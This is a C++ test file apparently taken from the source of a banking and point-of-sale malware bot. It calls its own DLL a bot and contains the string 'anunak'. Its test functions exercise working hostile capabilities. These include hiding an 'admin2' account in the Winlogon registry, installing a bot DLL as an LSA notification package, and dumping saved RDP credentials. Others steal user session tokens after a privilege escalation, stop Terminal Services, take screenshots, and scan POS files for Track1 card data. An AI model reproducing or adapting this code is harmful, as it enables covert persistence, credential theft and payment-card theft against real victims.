#include <stdio.h>
#include "core\core.h"
#include "core\path.h"
#include "core\process.h"
#include "core\http.h"
#include "core\file.h"
#include "core\vector.h"
#include "core\rand.h"
#include "core\crypt.h"
#include "core\util.h"
#include "core\cab.h"
#include "core\hook.h"
#include "core\reestr.h"
#include "core\elevation.h"
#include "core\service.h"
#include "core\FileTools.h"
//#include "mimikatz\mimikatz.h"
#include <conio.h>
#include <WinCred.h>
#include <Wtsapi32.h>

void test()
{
	StringBuilder url;
	HTTP::Request request;
	request.SetHost("mail.ru");
	request.SetFile("page.html");
	request.GetUrl(url);
	printf( "%s\n", url.c_str() );
	if( request.Get(2000) )
	{
		File::Write( "http.bin", request.Response() );
	}
	else
		printf( "request not exec\n" );
}

void test2()
{
	StringBuilder s( 32, "aaa bbbb ccccc");
	StringArray m = s.Split(' ');
	for( int i = 0; i < m.Count(); i++ )
		printf( "%s\n", m[i]->c_str() );
}

void test3()
{
	StringBuilder s;
	for( int i = 0; i < 10; i++ )
		printf( "%s\n", Rand::Gen( s, 10 ).c_str() );
}

void test4()
{
	char* data = "anunak"; //"check base64.";
	char* xor = "00d2a600031fb124";
	StringBuilder s;
	//Crypt::ToBase64( data, Str::Len(data), s );
	Crypt::Name( data, xor, s );
	printf( "'%s' %d\n", s.c_str(), s.Len() );
	Mem::Data data2;
	Crypt::FromBase64( s, data2 );
	printf( "'%s'\n", data2.Ptr() );
}

void test5()
{
	StringBuilder s1( 10, "123415678" );
	StringBuilderStack<10> s2( "123415678" );
	printf( "%s - %d\n%s - %d\n", s1.c_str(), s1.Len(), s2.c_str(), s2.Len() );
	//s1.Insert( 8, "abcdefghji" );
	//s2.Insert( 8, "abcdefghji" );
	//s1.Replace( 2, 3, 0 );//"abcdefgh" );
	//s2.Replace( 2, 3, 0 );//"abcdefgh" );
	s1.Replace( 1, 1, "1", nullptr );
	s2.Replace( 1, 1, "1", nullptr );
	printf( "%s - %d\n%s - %d", s1.c_str(), s1.Len(), s2.c_str(), s2.Len() );
}

void test6()
{
	char xor[] = "sjhkjshjs";
	StringBuilder path;
	Path::GetStartupExe(path);
	Crypt::FileName( xor, path );
	printf( "%s\n", path.c_str() );
	StringBuilderStack<MAX_PATH> startup;
	Path::GetStartupUser(startup);
	printf( "%s", startup.c_str() );
}

void test7()
{
	char ip[32];
	Socket::HostToIP( "bkontakte.dax.ru", ip );
	printf( "%s", ip );
}

void test8()
{
	char s[16];
	int len = Str::ToString( -12345, s );
	printf( "%s %d", s, len );
}

void test9()
{
	int v = Str::ToInt( "14", true );
	printf( "%d", v );
}

void test10()
{
	StringBuilder s( 128, "  1234   " );
	s.Trim();
	printf( "'%s'", s.c_str() );
}

void test11()
{
	if( !Screenshot::Init() )
	{
		printf( "not init" );
		return;
	}
	Mem::Data data;
	if( Screenshot::Make( 0, data ) )
	{
		printf( "ok" );
		File::Write( "screenshot.png", data );
	}
}

void test12()
{
	StringBuilderStack<10> IV( "WuWOaObw" );
	Mem::Data data;
	data.Copy( "12345678", 8 );
	Crypt::EncodeRC2( "1234567812345678", IV, data );
	File::Write( "crypt1.bin", data );
	data.Insert( 0, IV.c_str(), 8 );
	File::Write( "crypt2.bin", data );
	data.Submem(8);
	Crypt::DecodeRC2( "1234567812345678", IV, data );
	File::Write( "crypt3.bin", data );
}

void test13()
{
	uint v = 12345678;
	StringBuilderStack<32> s;
	s += '\'';
	s += v;
	s += '\'';
//	char buf[16];
//	int len = Str::ToString( v, buf, 10 );
	printf( "%s", s.c_str() );
}

void test14()
{
	Cab cab;
	cab.AddFolder( "folder", "E:\\projects\\progs\\cave\\", true );
/*
	cab.AddFile( "2\\test.txt", "qwerty", 6 );
	cab.AddFile( "1\\test.txt", "asdfgh", 6 );
	cab.AddFile( "3\\test.txt", "zxcvbn", 6 );
	cab.AddFile( "2\\core.lib", "core.lib" );
	cab.AddFile( "1\\test.txt", "RIVSOFT.LOG" );
	cab.AddFile( "test2.txt", "RIVSOFT.LOG" );
*/
	cab.Close();
	cab.Save( "test.cab" );
}

void test15()
{
	Mem::Data data;
	File::ReadAll( "test.cab", data );
	//File::ReadAll( "ammy.cab", data );
	printf( "%d", data.Len() );
	Cab::Extract( data, "O:\\botep\\bin\\Release debug string\\folder_cab" );
}

void test16()
{
	if( Process::Kill( "notepad.exe", 5000 ) )
		printf( "killed" );
	else
		printf( "not kill" );
}

void test17()
{
	Vector<int> m;
	m.Add(1);
	m.Add(2);
	int* v = m.Add();
	m.Add(4);
	*v = 3;
	for( int i = 0; i < m.Count(); i++ )
		printf( "%d ", m[i] );
}

void test18()
{
	StringBuilderStack<128> s( "123\n456" );
	StringArray ss = s.Split('\n');
	for( int i = 0; i < ss.Count(); i++ )
		printf( "%s (%d)\n", ss[i]->c_str(), ss[i]->Len() );
}

void test19()
{
	byte buf[16];
	buf[0] = 0x89;
	buf[1] = 0x45;
	buf[2] = 0xfc;
	buf[3] = 0x8b;
	buf[4] = 0x45;
	buf[5] = 0xfc;
	int len;
	Hook::GetAsmLen( buf, &len );
	printf( "%d", len );
}

void test20()
{
	wchar_t* s = L"Тест строки wchar_t";
	StringBuilderStack<20> s2;
	char s3[5];
	int len = WStr::ToWin1251( s, 4, 0, 0 );
	s2.ToWin1251(s);
	printf( "%d %s %d", len, s2.c_str(), s2.Len() );
}

void test21()
{
	char* s = "C:\\WINDOWS\\system32\\termsrv.dll";
	wchar_t sw[32];
	int len = Str::ToWideChar( s, 32, sw, 32 );
	char buf[128];
	wsprintf( buf, "%d '%S'\n", len, sw );
	printf(buf);
}

void test22()
{
	Reestr r;
	if( r.Create( HKEY_LOCAL_MACHINE, _CS_("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList") ) )
	{
		if( r.SetDWORD( "admin2", 0 ) )
			printf( "true" );
		else
			printf( "error %d", GetLastError() );
	}
}

void test23()
{
//	if( Elevation::NDProxy() )
//	{
//		printf( "Elevation succesful\n" );
//		if( MimikatzPatchRDP() )
//			printf( "ts::multirdp succesful\n" );
//		else
//			printf( "ts::multirdp wrong\n" );
//	}
	//else
//		printf( "Elevation wrong\n" );
	if( Process::Exec( "TestElevation.exe 4" ) )
		printf( "runned\n" );
	else
		printf( "not runned\n" );
}

static bool OffDcomlaunch()
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, _CS_("dcomlaunch"), SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		DWORD needed;
		SERVICE_FAILURE_ACTIONS sfa;
		sfa.dwResetPeriod = 60;
		sfa.lpRebootMsg = 0;
		sfa.lpCommand = 0; //cmd;
		SC_ACTION action;
		action.Type = SC_ACTION_NONE;
		action.Delay = 0;
		sfa.cActions = 1;
		sfa.lpsaActions = &action;
		if( API(ADVAPI32, ChangeServiceConfig2A)( hservice, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa ) )
			ret = true;
		API(ADVAPI32, CloseServiceHandle)(hservice);
	}
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;

}

void test24()
{
	//Service::Stop(_CS_("TermService"));
//	OffDcomlaunch();
//	Process::KillLoadedModule( "termsrv.dll" );
//	Delay(1000);
//	Service::Start(_CS_("TermService"));
	Service::Stop(_CS_("TermService"));
}

void test25()
{
	StringBuilderStack<32> s("1234");
	if( Mutex::Create(s) )
	{
		printf( "true" );
	}
	else
		printf( "false" );
	Delay(5000);
}

bool Lsa( const Mem::Data& dllBody, const StringBuilder& folder )
{
	Mem::Data data;
	printf( "1" );
	Reestr r( HKEY_LOCAL_MACHINE, _CS_("System\\CurrentControlSet\\Control\\Lsa") );
	if( !r.Valid() ) return false;
	printf( "2" );
	StringBuilderStack<32> NP( _CS_("Notification Packages") );
	if( !r.GetData( NP, data, REG_MULTI_SZ ) ) return false;
	StringBuilderStack<16> scecli( _CS_("scecli") );
	char* s = data.p_char();
	while( *s )
	{
		int p = Str::IndexOf( s, scecli, -1, scecli.Len() );
		if( p >= 0 )
		{
			int p2 = p + scecli.Len();
			if( s[p2] != 0 && ( s[p2 + 1] == 0 || s[p2 + 1] == '.' ) )
				break;

		}
		s += Str::Len(s) + 1;
	}
	StringBuilder reestrName(MAX_PATH), fileName(MAX_PATH);
	if( *s == 0 )
	{
		char c = Rand::Gen( 'a', 'z' );
		reestrName = scecli;
		reestrName += c;
	}
	else
		reestrName = s;
	fileName = reestrName;
	if( fileName.IndexOf(':') < 0 ) //только имя (не полный путь)
	{
		StringBuilderStack<MAX_PATH> path;
		Path::GetCSIDLPath( CSIDL_SYSTEM, path, fileName );
		fileName = path;
		fileName += _CS_(".dll");
	}
	bool ret = false;
	if( File::Write( fileName, dllBody ) ) //пишет в системную папку
		ret = true;
	else //пишем в переданную папку, такое может быть, если есть только права юзера
	{
		StringBuilderStack<MAX_PATH> path;
		Path::Combine( path, folder, Path::GetFileName(fileName) );
		fileName = path;
		if( File::Write( fileName, dllBody ) )
		{
			reestrName = fileName;
			ret = true;
		}
	}
	if( ret )
	{
		printf( "DLL бота сохранили в %s", fileName.c_str() );
		if( *s == 0 ) //еще в реестре нет записи
		{
			data.Insert( data.Len() - 1,  reestrName.c_str(), reestrName.Len() + 1 );
			if( r.SetData( NP, data, REG_MULTI_SZ ) )
			{
				printf( "Реестр был обновлен" );
				ret = true;
			}
			else
			{
				File::Delete(fileName);
				ret = false;
			}
		}
	}
	return ret;
}

void test26()
{
	Mem::Data data;
	StringBuilder s;
	s = "c:\\test";
	Lsa( data, s );
}

void test27()
{
	if( Elevation::PathRec() )
		Process::Exec( "calc.exe" );
}

void test28()
{
	DWORD count;
	PCREDENTIAL* creds;
	if( CredEnumerate( "TERMSRV/*", 0, &count, &creds ) )
	{
		for( int i = 0; i < count; i++ )
		{
			printf( "%s %s %S %d\n", creds[i]->UserName, creds[i]->TargetName, creds[i]->CredentialBlob, creds[i]->CredentialBlobSize );
//			printf( "%s %s %d -> [", creds[i]->UserName, creds[i]->TargetName, creds[i]->CredentialBlobSize );
//			for( int j = 0; j < creds[i]->CredentialBlobSize; j++ )
//				printf( "%02x ", creds[i]->CredentialBlob[j] );
//			printf( "]\n" );
		}
		CredFree(creds);
	}
	else
	{
		printf( "Error: %d\n", GetLastError() );
	}
}

void test29()
{
	Elevation::NDProxy();
	PWTS_SESSION_INFO si;
	DWORD count = 0;
	WTSEnumerateSessions( WTS_CURRENT_SERVER_HANDLE, 0, 1, &si, &count );
	printf( "%d\n", count );
	for( int i = 0; i < count; i++ )
	{
		printf( "%s\n", si[i].pWinStationName );
		HANDLE token;
		if( WTSQueryUserToken( si[i].SessionId, &token ) )
		{
			char* name;
			DWORD szName;
			WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE, si[i].SessionId, WTSUserName, &name, &szName );
			printf( "user: %s\n", name );
			HANDLE token2;
			if( DuplicateToken( token, SecurityImpersonation, &token2 ) )
			{
				printf( "token2: %08x\n", token2 );
				if( SetThreadToken( 0, token2 ) )
				{
					printf( "SetThreadToken is Ok\n" );
					HWINSTA winsta = OpenWindowStation( "Winsta0", TRUE, WINSTA_ENUMDESKTOPS ); //WINSTA_ALL_ACCESS );
					printf( "winsta: %08x\n", winsta );
					if( winsta )
					{
						if( SetProcessWindowStation(winsta) )
						{
							HDESK desk = OpenInputDesktop( 1, TRUE, GENERIC_ALL );
							printf( "desk: %08x\n", desk );
						}
					}
					else
					{
						printf( "winsta error: %d\n", GetLastError() );
					}
				}
				API(KERNEL32, CloseHandle)(token2);
			}
			API(KERNEL32, CloseHandle)(token);
		}
		RevertToSelf();
	}
}

void PrintPriv( HANDLE token )
{
	TOKEN_PRIVILEGES* priv;
	DWORD size;
	GetTokenInformation( token, TokenPrivileges, 0, 0, &size );
	priv = (TOKEN_PRIVILEGES*)Mem::Alloc(size);
	GetTokenInformation( token, TokenPrivileges, priv, size, &size );
	for( int i = 0; i < priv->PrivilegeCount; i++ )
	{
		char name[256];
		DWORD szName = sizeof(name);
		LookupPrivilegeName( 0, &priv->Privileges[i].Luid, name, &szName );
		printf( "%d - %s\n", i + 1, name );
	}
}

void test30()
{
	Elevation::NDProxy();
	PWTS_SESSION_INFO si;
	DWORD count = 0;
	WTSEnumerateSessions( WTS_CURRENT_SERVER_HANDLE, 0, 1, &si, &count );
	HANDLE token;
	for( int i = 0; i < count; i++ )
	{
		char* name;
		DWORD szName;
		WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE, si[i].SessionId, WTSUserName, &name, &szName );
		printf( "user: %s\n", name );
		if( WTSQueryUserToken( si[i].SessionId, &token ) )
		{
			PrintPriv(token);
			API(KERNEL32, CloseHandle)(token);
		}
	}
	DWORD pid = Process::GetExplorerPID();
	printf( "Explorer: %d\n", pid );
	if( pid ) 
	{
		HANDLE hprocess_u = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if( hprocess_u )
		{
			if( OpenProcessToken( hprocess_u, TOKEN_ALL_ACCESS, &token ) )
			{
				PrintPriv(token);
			}
		}	
		API(KERNEL32, CloseHandle)(hprocess_u);
	}
}

bool MonitoringCB( File::MonitoringStru* m )
{
	if( m )
	{
		printf( "%s %d\n", m->fullName->c_str(), m->action );
		if( m->action == FILE_ACTION_MODIFIED )
		{
			Mem::Data data;
			File::ReadAll( m->fullName->c_str(), data );
			StringBuilder s(data);
			int p1 = 0;
			for(;;)
			{
				p1 = s.IndexOf( p1, "<POSMessage" );
				if( p1 >= 0 )
				{
					int p2 = s.IndexOf( p1, "POSMessage>" );
					if( p2 > 0 )
					{
						int p3 = s.IndexOf( p1, "<Track1Data>" );
						if( p3 > 0 && p3 < p2 )
						{
							int p4 = s.IndexOf( p3, "</Track1Data>" );
							if( p4 > 0 && p4 < p2 && p4 - p3 > 50 )
							{
								printf( "yes\n" );
							}
						}
						p1 = p2 + 10;
					}
					else
						break; //нужно еще ждать
				}
				else
					break; //удаление файла
			}
		}
	}
	else
		printf( "waiting ...\n" );
	return true;
}

void test31()
{
	File::MonitoringStru files[1];
	files[0].fileName = "test.txt";
	files[0].tag = 0;
	int res = File::Monitoring( "o:\\temp\\333", files, 1, MonitoringCB, 5000 );
//	int res = File::Monitoring( "o:\\temp\\333", 0, 0, MonitoringCB, 5000 );
}

void test32()
{
	StringBuilder s;
	if( Process::GetCommandLine( 9996/*10324*/, s ) )
		printf( "%s", s.c_str() );
	else
		printf( "error" );
}

int main(int argc, char* argv[])
{
	WinAPI::Init();
	if( !Core::Init() )
	{
		printf( "core is not init\n" );
		return 0;
	}
	Socket::Init();
	Rand::Init();
	test32();

	Socket::Release();
	Core::Release();
	return 0;
}

/*
StringDecoded DECODE_STRING( const char* codeStr )
{
	char* s = Str::Duplication(codeStr);
	return StringDecoded(s);
}
*/
